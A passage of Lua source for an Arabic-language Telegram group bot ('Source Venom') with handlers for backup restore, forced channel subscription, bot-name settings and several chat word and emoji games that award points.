if text and (text == 'رفع النسخه' or text == 'رفع النسخه الاحتياطيه' or text == 'رفع نسخه الاحتياطيه') and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source Venom     --
if DevAbs:get(Venom.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Abs( msg.chat_id_, msg.id_, 1,"𖠧︙يوجد فقط ( 6 ) اختيارات\n𖠧︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevAbs:get(Venom.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(Venom.."SET:GAME"..msg.chat_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'𖠧︙*المحيبس باليد رقم* ↫ '..NUM..'\n𖠧︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:del(Venom.."SET:GAME"..msg.chat_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'𖠧︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n𖠧︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevAbs:get(Venom..'DevAbs4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "𖠧︙تم الغاء الامر")
DevAbs:del(Venom..'DevAbs4'..msg.sender_user_id_)
return false  end 
DevAbs:del(Venom..'DevAbs4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '𖠧︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '𖠧︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '𖠧︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'𖠧︙البوت ادمن في القناة \n𖠧︙تم تفعيل الاشتراك الاجباري \n𖠧︙ايدي القناة ↫ '..data.id_..'\n𖠧︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
DevAbs:set(Venom..'Abs:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'𖠧︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
--     Source Venom     --
if DevAbs:get(Venom.."Abs:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevAbs:del(Venom.."Abs:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء الامر', 1, 'md')
return false 
end 
DevAbs:del(Venom.."Abs:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevAbs:set(Venom.."DevText", DevText)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ كليشة المطور", 1, "md")
end
if DevAbs:get(Venom..'Abs:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevAbs:del(Venom..'Abs:NameBot'..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ اسم البوت ', 1, 'html')
DevAbs:del(Venom..'Abs:NameBot'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:NameBot', text)
return false 
end
--     Source Venom     --
if text == "الرابط" then
if not DevAbs:get(Venom.."Abs:Lock:GpLinks"..msg.chat_id_) then 
if DevAbs:get(Venom.."Abs:Groups:Links"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..DevAbs:get(Venom.."Abs:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙جلب رابط المجموعه معطل', 1, 'md')
end
end
--     Source Venom     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (DevAbs:get(Venom..'Abs:NameBot') or 'ڤينوم')
local VenomTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM[math.random(#VenomTEAM)] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevAbs:get(Venom..'Abs:NameBot') or 'ڤينوم') 
local VenomTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM[math.random(#VenomTEAM)] , 1, 'html') 
return false
end
if text and text == (DevAbs:get(Venom..'Abs:NameBot') or 'ڤينوم') then 
NameBot = (DevAbs:get(Venom..'Abs:NameBot') or 'ڤينوم')
local VenomTEAM = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM[math.random(#VenomTEAM)] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لم تربح اي نقطه\n𖠧︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙عدد النقاط التي ربحتها ↫ '..(DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevAbs:del(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevAbs:del(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حذف جميع نقاطك', 1, 'md') end
--     Source Venom     --
if text == 'سمايلات' and SourceCh(msg) or text == 'السمايلات' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
VenomTEAM = '𖠧︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and SourceCh(msg) or text == 'الترتيب' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
VenomTEAM = '𖠧︙اول واحد يرتبها يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ ترتيب للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and SourceCh(msg) or text == 'بات' and SourceCh(msg) or text == 'المحيبس' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevAbs:set(Venom.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

𖠧︙اختر رقم لاستخراج المحيبس
𖠧︙الفائز يحصل على (5) نقاط
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAbs:setex(Venom.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and SourceCh(msg) or text == 'الحزوره' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
VenomTEAM = '𖠧︙اول واحد يحلها يربح ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum'..msg.chat_id_) and not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ حزوره للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and SourceCh(msg) or text == 'معاني' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum2'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
VenomTEAM = '𖠧︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum2'..msg.chat_id_) and not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ المعاني للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and SourceCh(msg) or text == 'عكس' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum3'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
VenomTEAM = '𖠧︙ما هو عكس كلمة ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum3'..msg.chat_id_) and not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ العكس للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and SourceCh(msg) or text == 'مختلف' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum4'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
